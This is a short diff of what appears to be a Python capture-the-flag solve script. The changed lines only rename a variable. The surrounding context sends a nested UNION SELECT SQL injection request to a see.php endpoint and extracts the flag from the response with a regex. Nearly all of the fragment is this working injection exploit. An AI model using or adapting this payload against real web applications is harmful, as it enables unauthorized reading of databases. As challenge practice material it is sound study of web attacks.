@@ -11,6 +11,6 @@ def encode(query):
     return vuln
 
 payload = requests.get(f"{URL}see.php?id=0 UNION SELECT {encode('0 UNION SELECT flag FROM flag -- ')},null,null -- -").text
-matches = re.findall(r'flag\{.*?}', payload)
-if matches:
-    print(matches[0])
+flag = re.findall(r'flag\{.*?}', payload)
+if flag:
+    print(flag[0])
